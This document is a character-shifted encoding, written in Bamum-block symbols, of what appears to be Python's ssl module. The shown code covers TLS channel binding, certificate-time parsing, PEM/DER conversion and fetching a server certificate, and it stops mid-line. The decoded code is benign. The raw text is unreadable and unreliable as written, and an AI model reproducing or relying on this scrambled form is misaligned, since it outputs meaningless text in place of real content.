ꛪꛮ꛳ꛬ꛹꛹꛰꛷ꛪꛭ꛴꛹ꛯ꛴꛹꛲ꚳ꛾꛰꛷꛱ꚷꚫꛮꛭꛪ꛿꜄꛻꛰ꛈꚭ꛿꛷꛾ꚸ꜀꛹꛴꛼꜀꛰ꚭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛲꛰꛿ꛪꛮ꛳ꛬ꛹꛹꛰꛷ꛪꛭ꛴꛹ꛯ꛴꛹꛲ꚳꛮꛭꛪ꛿꜄꛻꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮꛭꛪ꛿꜄꛻꛰ꚫ꛹꛺꛿ꚫ꛴꛹ꚫꛎꛓꛌꛙꛙꛐꛗꛪꛍꛔꛙꛏꛔꛙꛒꛪꛟꛤꛛꛐꛞꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꜆ꚻ꜈ꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚫꛭ꛴꛹ꛯ꛴꛹꛲ꚫ꛿꜄꛻꛰ꚫ꛹꛺꛿ꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꚭꚹ꛱꛺꛽꛸ꛬ꛿ꚳꛮꛭꛪ꛿꜄꛻꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜁꛰꛽꛾꛴꛺꛹ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚕꚕꚮꚫꛛ꜄꛿꛳꛺꛹ꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿ꚫ꛱꛺꛽꜂ꛬ꛽ꛯꚫꛯ꛰ꛮ꛷ꛬ꛽ꛬ꛿꛴꛺꛹ꚫ꛺꛱ꚫ꛿꜄꛻꛰꛾ꚹꚕꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹ꛾꛾꛷꛾꛺ꛮ꛶꛰꛿ꛪꛮ꛷ꛬ꛾꛾ꚫꛈꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚕꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹ꛾꛾꛷꛺ꛭ꛵꛰ꛮ꛿ꛪꛮ꛷ꛬ꛾꛾ꚫꛈꚫꛞꛞꛗꛚꛭ꛵꛰ꛮ꛿ꚕꚕꚕꛯ꛰꛱ꚫ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳ꛾꛺ꛮ꛶ꚷꚫ꛶꛰꜄꛱꛴꛷꛰ꛈꛙ꛺꛹꛰ꚷꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꛈꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈꛑꛬ꛷꛾꛰ꚷꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꛈꛎꛐꛝꛟꛪꛙꛚꛙꛐꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꛈꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꚷꚫꛮꛬꛪꛮ꛰꛽꛿꛾ꛈꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛈꛟ꛽꜀꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛈꛟ꛽꜀꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛴꛻꛳꛰꛽꛾ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛾꛷ꚹ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚫ꛴꛾ꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛰ꛯꚷꚫ꜀꛾꛰ꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛿꛰꛲꛺꛽꜄ꛈꛏ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꛢꛬ꛽꛹꛴꛹꛲ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛿ꛬꛮ꛶꛷꛰꜁꛰꛷ꛈꚽꚕꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛮ꛰꛽꛿꛱꛴꛷꛰ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫ꛱꛺꛽ꚫ꛾꛰꛽꜁꛰꛽ꚸ꛾꛴ꛯ꛰ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹꛾ꚭꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛶꛰꜄꛱꛴꛷꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛮ꛰꛽꛿꛱꛴꛷꛰ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚭꚴꚕꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚳ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꚴꚕꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚫꛈꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꚕꚫꚫꚫꚫ꛴꛱ꚫꛮꛬꛪꛮ꛰꛽꛿꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪ꜁꛰꛽꛴꛱꜄ꛪ꛷꛺ꛮꛬ꛿꛴꛺꛹꛾ꚳꛮꛬꛪꛮ꛰꛽꛿꛾ꚴꚕꚫꚫꚫꚫ꛴꛱ꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪꛮ꛰꛽꛿ꛪꛮ꛳ꛬ꛴꛹ꚳꛮ꛰꛽꛿꛱꛴꛷꛰ꚷꚫ꛶꛰꜄꛱꛴꛷꛰ꚴꚕꚫꚫꚫꚫ꛴꛱ꚫꛮ꛴꛻꛳꛰꛽꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛾꛰꛿ꛪꛮ꛴꛻꛳꛰꛽꛾ꚳꛮ꛴꛻꛳꛰꛽꛾ꚴꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꛈ꛾꛺ꛮ꛶ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛈꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛈ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꚕꚫꚫꚫꚫꚴꚕꚕꚮꚫ꛾꛺꛸꛰ꚫ꜀꛿꛴꛷꛴꛿꜄ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹꛾ꚕꚕꛯ꛰꛱ꚫꛮ꛰꛽꛿ꛪ꛿꛴꛸꛰ꛪ꛿꛺ꛪ꛾꛰ꛮ꛺꛹ꛯ꛾ꚳꛮ꛰꛽꛿ꛪ꛿꛴꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛿꛴꛸꛰ꚫ꛴꛹ꚫ꛾꛰ꛮ꛺꛹ꛯ꛾ꚫ꛾꛴꛹ꛮ꛰ꚫ꛿꛳꛰ꚫꛐ꛻꛺ꛮ꛳ꚷꚫ꛲꛴꜁꛰꛹ꚫ꛿꛳꛰ꚫ꛿꛴꛸꛰꛾꛿꛽꛴꛹꛲ꚕꚫꚫꚫꚫ꛽꛰꛻꛽꛰꛾꛰꛹꛿꛴꛹꛲ꚫ꛿꛳꛰ꚫꚭ꛹꛺꛿ꛍ꛰꛱꛺꛽꛰ꚭꚫ꛺꛽ꚫꚭ꛹꛺꛿ꛌ꛱꛿꛰꛽ꚭꚫꛯꛬ꛿꛰ꚫ꛱꛽꛺꛸ꚫꛬꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚕꚫꚫꚫꚫ꛴꛹ꚫꛫꛫꚭꚰꛭꚫꚰꛯꚫꚰꛓꛅꚰꛘꛅꚰꛞꚫꚰꛤꚫꚰꛥꚭꛫꛫꚫ꛾꛿꛽꛻꛿꛴꛸꛰ꚫ꛱꛺꛽꛸ꛬ꛿ꚫꚳꛎꚫ꛷꛺ꛮꛬ꛷꛰ꚴꚹꚕꚕꚫꚫꚫꚫꚭ꛹꛺꛿ꛍ꛰꛱꛺꛽꛰ꚭꚫ꛺꛽ꚫꚭ꛹꛺꛿ꛌ꛱꛿꛰꛽ꚭꚫꛯꛬ꛿꛰꛾ꚫ꛸꜀꛾꛿ꚫ꜀꛾꛰ꚫꛠꛟꛎꚫꚳꛝꛑꛎꚫꛀꚽꛃꚻꚴꚹꚕꚕꚫꚫꚫꚫꛘ꛺꛹꛿꛳ꚫ꛴꛾ꚫ꛺꛹꛰ꚫ꛺꛱ꛅꚫꛕꛬ꛹ꚫꛑ꛰ꛭꚫꛘꛬ꛽ꚫꛌ꛻꛽ꚫꛘꛬ꜄ꚫꛕ꜀꛹ꚫꛕ꜀꛷ꚫꛌ꜀꛲ꚫꛞ꛰꛻ꚫꛚꛮ꛿ꚫꛙ꛺꜁ꚫꛏ꛰ꛮꚕꚫꚫꚫꚫꛠꛟꛎꚫ꛾꛳꛺꜀꛷ꛯꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫꛬ꛾ꚫꛒꛘꛟꚫꚳ꛾꛰꛰ꚫꛌꛞꛙꚼꛪꛟꛔꛘꛐꛪ꛻꛽꛴꛹꛿ꚳꚴꚴꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛱꛽꛺꛸ꚫ꛿꛴꛸꛰ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛾꛿꛽꛻꛿꛴꛸꛰ꚕꚫꚫꚫꚫ꛱꛽꛺꛸ꚫꛮꛬ꛷꛰꛹ꛯꛬ꛽ꚫ꛴꛸꛻꛺꛽꛿ꚫ꛿꛴꛸꛰꛲꛸ꚕꚕꚫꚫꚫꚫ꛸꛺꛹꛿꛳꛾ꚫꛈꚫꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꛕꛬ꛹ꚭꚷꚭꛑ꛰ꛭꚭꚷꚭꛘꛬ꛽ꚭꚷꚭꛌ꛻꛽ꚭꚷꚭꛘꛬ꜄ꚭꚷꚭꛕ꜀꛹ꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꛕ꜀꛷ꚭꚷꚭꛌ꜀꛲ꚭꚷꚭꛞ꛰꛻ꚭꚷꚭꛚꛮ꛿ꚭꚷꚭꛙ꛺꜁ꚭꚷꚭꛏ꛰ꛮꚭꚕꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫ꛿꛴꛸꛰ꛪ꛱꛺꛽꛸ꛬ꛿ꚫꛈꚫꚲꚫꚰꛯꚫꚰꛓꛅꚰꛘꛅꚰꛞꚫꚰꛤꚫꛒꛘꛟꚲꚫꚮꚫꛙꛚꛟꛐꛅꚫ꛹꛺ꚫ꛸꛺꛹꛿꛳ꚷꚫ꛱꛴꜃꛰ꛯꚫꛒꛘꛟꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛺꛹꛿꛳ꛪ꛹꜀꛸ꛭ꛰꛽ꚫꛈꚫ꛸꛺꛹꛿꛳꛾ꚹ꛴꛹ꛯ꛰꜃ꚳꛮ꛰꛽꛿ꛪ꛿꛴꛸꛰ꛦꛅꚾꛨꚹ꛿꛴꛿꛷꛰ꚳꚴꚴꚫꚶꚫꚼꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚲ꛿꛴꛸꛰ꚫꛯꛬ꛿ꛬꚫꚰ꛽ꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛸ꛬ꛿ꛮ꛳ꚫꚲꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚲ꛱꛺꛽꛸ꛬ꛿ꚫꚭꚰꚰꛭꚰ꛾ꚭꚲꚫꚰꚫꚳꛮ꛰꛽꛿ꛪ꛿꛴꛸꛰ꚷꚫ꛿꛴꛸꛰ꛪ꛱꛺꛽꛸ꛬ꛿ꚴꚴꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛱꛺꜀꛹ꛯꚫ꜁ꛬ꛷꛴ꛯꚫ꛸꛺꛹꛿꛳ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛿ꚫꛈꚫ꛾꛿꛽꛻꛿꛴꛸꛰ꚳꛮ꛰꛽꛿ꛪ꛿꛴꛸꛰ꛦꚾꛅꛨꚷꚫ꛿꛴꛸꛰ꛪ꛱꛺꛽꛸ꛬ꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛽꛰꛿꜀꛽꛹ꚫꛬ꛹ꚫ꛴꛹꛿꛰꛲꛰꛽ꚷꚫ꛿꛳꛰ꚫ꛻꛽꛰꜁꛴꛺꜀꛾ꚫ꛸꛶꛿꛴꛸꛰ꚳꚴꚸꛭꛬ꛾꛰ꛯꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿ꛬ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛬꚫ꛱꛷꛺ꛬ꛿ꚫꚳ꛱꛽ꛬꛮ꛿꛴꛺꛹ꛬ꛷ꚫ꛾꛰ꛮ꛺꛹ꛯ꛾ꚫꛬ꛽꛰ꚫꛬ꛷꜂ꛬ꜄꛾ꚫ꜅꛰꛽꛺ꚫ꛳꛰꛽꛰ꚴꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛴꛸꛰꛲꛸ꚳꚳ꛿꛿ꛦꚻꛨꚷꚫ꛸꛺꛹꛿꛳ꛪ꛹꜀꛸ꛭ꛰꛽ꚴꚫꚶꚫ꛿꛿ꛦꚽꛅꛁꛨꚴꚕꚕꛛꛐꛘꛪꛓꛐꛌꛏꛐꛝꚫꛈꚫꚭꚸꚸꚸꚸꚸꛍꛐꛒꛔꛙꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚸꚸꚸꚸꚸꚭꚕꛛꛐꛘꛪꛑꛚꛚꛟꛐꛝꚫꛈꚫꚭꚸꚸꚸꚸꚸꛐꛙꛏꚫꛎꛐꛝꛟꛔꛑꛔꛎꛌꛟꛐꚸꚸꚸꚸꚸꚭꚕꚕꛯ꛰꛱ꚫꛏꛐꛝꛪꛮ꛰꛽꛿ꛪ꛿꛺ꛪꛛꛐꛘꛪꛮ꛰꛽꛿ꚳꛯ꛰꛽ꛪꛮ꛰꛽꛿ꛪꛭ꜄꛿꛰꛾ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛟꛬ꛶꛰꛾ꚫꛬꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛴꛹ꚫꛭ꛴꛹ꛬ꛽꜄ꚫꛏꛐꛝꚫ꛱꛺꛽꛸ꛬ꛿ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹꛾ꚫ꛿꛳꛰ꚕꚫꚫꚫꚫꛛꛐꛘꚫ꜁꛰꛽꛾꛴꛺꛹ꚫ꛺꛱ꚫ꛴꛿ꚫꛬ꛾ꚫꛬꚫ꛾꛿꛽꛴꛹꛲ꚹꚭꚭꚭꚕꚕꚫꚫꚫꚫ꛱ꚫꛈꚫ꛾꛿꛽ꚳꛭꛬ꛾꛰ꛁꚿꚹ꛾꛿ꛬ꛹ꛯꛬ꛽ꛯꛪꛭꛁꚿ꛰꛹ꛮ꛺ꛯ꛰ꚳꛯ꛰꛽ꛪꛮ꛰꛽꛿ꛪꛭ꜄꛿꛰꛾ꚴꚷꚫꚲꛌꛞꛎꛔꛔꚲꚷꚫꚲ꛾꛿꛽꛴ꛮ꛿ꚲꚴꚕꚫꚫꚫꚫ꛾꛾ꚫꛈꚫꛦꛛꛐꛘꛪꛓꛐꛌꛏꛐꛝꛨꚕꚫꚫꚫꚫ꛾꛾ꚫꚶꛈꚫꛦ꛱ꛦ꛴ꛅ꛴ꚶꛁꚿꛨꚫ꛱꛺꛽ꚫ꛴ꚫ꛴꛹ꚫ꛽ꛬ꛹꛲꛰ꚳꚻꚷꚫ꛷꛰꛹ꚳ꛱ꚴꚷꚫꛁꚿꚴꛨꚕꚫꚫꚫꚫ꛾꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳꛛꛐꛘꛪꛑꛚꛚꛟꛐꛝꚫꚶꚫꚲꛧ꛹ꚲꚴꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꚲꛧ꛹ꚲꚹ꛵꛺꛴꛹ꚳ꛾꛾ꚴꚕꚕꛯ꛰꛱ꚫꛛꛐꛘꛪꛮ꛰꛽꛿ꛪ꛿꛺ꛪꛏꛐꛝꛪꛮ꛰꛽꛿ꚳ꛻꛰꛸ꛪꛮ꛰꛽꛿ꛪ꛾꛿꛽꛴꛹꛲ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛟꛬ꛶꛰꛾ꚫꛬꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛴꛹ꚫꛌꛞꛎꛔꛔꚫꛛꛐꛘꚫ꛱꛺꛽꛸ꛬ꛿ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹꛾ꚫ꛿꛳꛰ꚕꚫꚫꚫꚫꛏꛐꛝꚸ꛰꛹ꛮ꛺ꛯ꛰ꛯꚫ꜁꛰꛽꛾꛴꛺꛹ꚫ꛺꛱ꚫ꛴꛿ꚫꛬ꛾ꚫꛬꚫꛭ꜄꛿꛰ꚫ꛾꛰꛼꜀꛰꛹ꛮ꛰ꚭꚭꚭꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛻꛰꛸ꛪꛮ꛰꛽꛿ꛪ꛾꛿꛽꛴꛹꛲ꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꛛꛐꛘꛪꛓꛐꛌꛏꛐꛝꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛛꛐꛘꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꛆꚫ꛸꜀꛾꛿ꚫ꛾꛿ꛬ꛽꛿ꚫ꜂꛴꛿꛳ꚫꚰ꛾ꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚰꚫꛛꛐꛘꛪꛓꛐꛌꛏꛐꛝꚴꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛻꛰꛸ꛪꛮ꛰꛽꛿ꛪ꛾꛿꛽꛴꛹꛲ꚹ꛾꛿꛽꛴꛻ꚳꚴꚹ꛰꛹ꛯ꛾꜂꛴꛿꛳ꚳꛛꛐꛘꛪꛑꛚꛚꛟꛐꛝꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛔ꛹꜁ꛬ꛷꛴ꛯꚫꛛꛐꛘꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꛆꚫ꛸꜀꛾꛿ꚫ꛰꛹ꛯꚫ꜂꛴꛿꛳ꚫꚰ꛾ꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚰꚫꛛꛐꛘꛪꛑꛚꛚꛟꛐꛝꚴꚕꚫꚫꚫꚫꛯꚫꛈꚫ꛻꛰꛸ꛪꛮ꛰꛽꛿ꛪ꛾꛿꛽꛴꛹꛲ꚹ꛾꛿꛽꛴꛻ꚳꚴꛦ꛷꛰꛹ꚳꛛꛐꛘꛪꛓꛐꛌꛏꛐꛝꚴꛅꚸ꛷꛰꛹ꚳꛛꛐꛘꛪꛑꛚꛚꛟꛐꛝꚴꛨꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛭꛬ꛾꛰ꛁꚿꚹꛯ꛰ꛮ꛺ꛯ꛰ꛭ꜄꛿꛰꛾ꚳꛯꚹ꛰꛹ꛮ꛺ꛯ꛰ꚳꚲꛌꛞꛎꛔꛔꚲꚷꚫꚲ꛾꛿꛽꛴ꛮ꛿ꚲꚴꚴꚕꚕꛯ꛰꛱ꚫ꛲꛰꛿ꛪ꛾꛰꛽꜁꛰꛽ꛪꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚳꛬꛯꛯ꛽ꚷꚫ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꛈꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛎꛗꛔꛐꛙꛟꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬꛪꛮ꛰꛽꛿꛾ꛈꛙ꛺꛹꛰ꚷꚫ꛿꛴꛸꛰꛺꜀꛿ꛈꛪꛒꛗꛚꛍꛌꛗꛪꛏꛐꛑꛌꛠꛗꛟꛪꛟꛔꛘꛐꛚꛠꛟꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꛽꛴꛰꜁꛰ꚫ꛿꛳꛰ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛾꛰꛽꜁꛰꛽ꚫꛬ꛿ꚫ꛿꛳꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫꛬꛯꛯ꛽꛰꛾꛾ꚷꚕꚫꚫꚫꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛴꛿ꚫꛬ꛾ꚫꛬꚫꛛꛐꛘꚸ꛰꛹ꛮ꛺ꛯ꛰ꛯꚫ꛾꛿꛽꛴꛹꛲ꚹꚕꚫꚫꚫꚫꛔ꛱ꚫꚲꛮꛬꛪꛮ꛰꛽꛿꛾ꚲꚫ꛴꛾ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚷꚫ꜁ꛬ꛷꛴ꛯꛬ꛿꛰ꚫ꛿꛳꛰ꚫ꛾꛰꛽꜁꛰꛽ꚫꛮ꛰꛽꛿ꚫꛬ꛲ꛬ꛴꛹꛾꛿ꚫ꛴꛿ꚹꚕꚫꚫꚫꚫꛔ꛱ꚫꚲ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꚲꚫ꛴꛾ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚷꚫ꜀꛾꛰ꚫ꛴꛿ꚫ꛴꛹ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫꛬ꛿꛿꛰꛸꛻꛿ꚹꚕꚫꚫꚫꚫꛔ꛱ꚫꚲ꛿꛴꛸꛰꛺꜀꛿ꚲꚫ꛴꛾ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚷꚫ꜀꛾꛰ꚫ꛴꛿ꚫ꛴꛹ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫꛬ꛿꛿꛰꛸꛻꛿ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚕꚫꚫꚫꚫ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚫꛈꚫꛬꛯꛯ꛽ꚕꚫꚫꚫꚫ꛴꛱ꚫꛮꛬꛪꛮ꛰꛽꛿꛾ꚫ꛴꛾ꚫ꛹